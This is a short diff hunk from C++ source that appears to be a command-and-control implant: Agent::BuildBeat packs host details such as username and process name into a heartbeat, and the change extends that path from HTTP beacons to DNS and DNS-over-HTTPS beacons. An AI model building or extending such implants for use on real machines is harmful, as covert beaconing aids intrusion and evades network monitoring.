@@ -120,7 +120,7 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
 	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));
 
-#if defined(BEACON_HTTP) 
+#if defined(BEACON_HTTP) || defined(BEACON_DNS) || defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
 
 	ULONG beat_size = packer->datasize();
 	PBYTE beat      = packer->data();
